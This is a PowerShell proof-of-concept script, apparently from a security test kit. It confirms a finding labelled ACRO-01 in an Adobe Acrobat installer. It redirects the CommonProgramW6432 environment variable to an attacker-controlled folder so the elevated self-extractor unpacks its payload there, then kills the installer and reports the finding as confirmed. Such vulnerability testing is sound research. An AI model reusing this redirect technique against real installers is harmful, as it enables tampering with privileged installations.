param(
    [string]$InstallerPath,
    [string]$OutDir,
    [int]$TimeoutMinutes = 20
)

# Extract the genuine installer payload (AcroPro.msi, Core.cab, setup.exe, setup.ini, .msp)
# by redirecting %CommonProgramW6432% (demonstrates ACRO-01) and killing the SFX
# before it runs setup.exe. Requires Administrator.

. (Join-Path $PSScriptRoot 'common.ps1')
Write-Header 'Extract installer payload (ACRO-01 environment redirect)'
Require-Admin

$inst = Get-InstallerPath $InstallerPath
if (-not $OutDir) { $OutDir = Join-Path $WorkDir 'payload-source' }
if (Test-Path $OutDir) { Remove-Item -Recurse -Force $OutDir -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

$stage = Join-Path $WorkDir 'sfx-stage'
if (Test-Path $stage) { Remove-Item -Recurse -Force $stage -ErrorAction SilentlyContinue }
$attacker = Join-Path $stage 'Common Files\Adobe'
New-Item -ItemType Directory -Force -Path $attacker | Out-Null

$oldUser = [Environment]::GetEnvironmentVariable('CommonProgramW6432', 'User')
$oldProc = $env:CommonProgramW6432
[Environment]::SetEnvironmentVariable('CommonProgramW6432', $attacker, 'User')
$env:CommonProgramW6432 = $attacker

$proc = Start-Process -FilePath $inst -PassThru
$deadline = (Get-Date).AddMinutes($TimeoutMinutes)
$source = $null
$lastSize = -1
$stable = 0
while ((Get-Date) -lt $deadline) {
    $msi = Get-ChildItem -Path $stage -Recurse -Filter 'AcroPro.msi' -File -ErrorAction SilentlyContinue | Select-Object -First 1
    $cab = Get-ChildItem -Path $stage -Recurse -Filter 'Core.cab' -File -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($msi -and $cab) {
        $size = $msi.Length + $cab.Length
        if ($size -eq $lastSize) { $stable++ } else { $stable = 0; $lastSize = $size }
        if ($stable -ge 3) { $source = Split-Path -Parent $msi.FullName; break }
    }
    if ($proc.HasExited) { break }
    Start-Sleep -Milliseconds 500
}

if ($proc -and -not $proc.HasExited) { Stop-Tree $proc.Id }
Get-Process setup,msiexec -ErrorAction SilentlyContinue | ForEach-Object { Stop-Tree $_.Id }
[Environment]::SetEnvironmentVariable('CommonProgramW6432', $oldUser, 'User')
$env:CommonProgramW6432 = $oldProc

if (-not $source) {
    Write-Warning "Payload not found under $stage (timeout or extraction failed)."
    Emit-Result 'ACRO-01' 'UNCONFIRMED' 'payload extraction did not complete (see AdobeSFX log)'
    return
}

# Copy the source files to a stable folder (RDC may be cleaned by the SFX).
Get-ChildItem -Path $source -File -ErrorAction SilentlyContinue | ForEach-Object {
    Copy-Item $_.FullName (Join-Path $OutDir $_.Name) -Force
}
$src = Join-Path $OutDir 'AcroPro.msi'
if (Test-Path $src) {
    Emit-Result 'ACRO-01' 'CONFIRMED' ("elevated SFX extracted payload under attacker path: " + $source)
    Write-Host ("Payload source: {0}" -f $OutDir) -ForegroundColor Green
    Set-Content -LiteralPath (Join-Path $WorkDir 'payload-source.txt') -Value $OutDir
} else {
    Emit-Result 'ACRO-01' 'UNCONFIRMED' 'payload files not copied'
}
